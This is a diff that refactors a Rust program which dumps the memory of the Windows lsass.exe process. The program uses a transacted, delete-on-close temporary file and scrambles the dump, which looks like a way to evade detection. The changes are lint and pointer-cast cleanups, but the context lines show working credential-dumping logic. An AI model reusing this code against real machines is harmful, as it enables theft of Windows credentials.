@@ -78,9 +78,13 @@ use sysinfo::System;
 
 use windows::core::{PCSTR, PCWSTR};
 use windows::Win32::Foundation::CloseHandle;
+#[allow(clippy::wildcard_imports)]
 use windows::Win32::Storage::FileSystem::*;
+#[allow(clippy::wildcard_imports)]
 use windows::Win32::System::Diagnostics::Debug::*;
+#[allow(clippy::wildcard_imports)]
 use windows::Win32::System::Memory::*;
+#[allow(clippy::wildcard_imports)]
 use windows::Win32::System::Threading::*;
 
 const LSASS: &str = "lsass.exe";
@@ -140,7 +144,9 @@ fn dump() -> Result<(), Box<dyn Error>> {
             FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
             None,
             txf_handle,
-            Some(&TXFS_MINIVERSION_DIRTY_VIEW as *const TXFS_MINIVERSION),
+            Some(std::ptr::from_ref::<TXFS_MINIVERSION>(
+                &TXFS_MINIVERSION_DIRTY_VIEW,
+            )),
             None,
         )?
     };
@@ -161,7 +167,11 @@ fn dump() -> Result<(), Box<dyn Error>> {
 
     // Map a view of the intermediate file into our address space
     let map_handle = unsafe { CreateFileMappingW(file_handle, None, PAGE_READONLY, 0, 0, None)? };
-    let ptr = unsafe { MapViewOfFile(map_handle, FILE_MAP_READ, 0, 0, 0).Value as *mut u8 };
+    let ptr = unsafe {
+        MapViewOfFile(map_handle, FILE_MAP_READ, 0, 0, 0)
+            .Value
+            .cast::<u8>()
+    };
 
     // Scramble dump using a temporary vector to hold data
     let size = unsafe { GetFileSize(file_handle, None) } as usize;
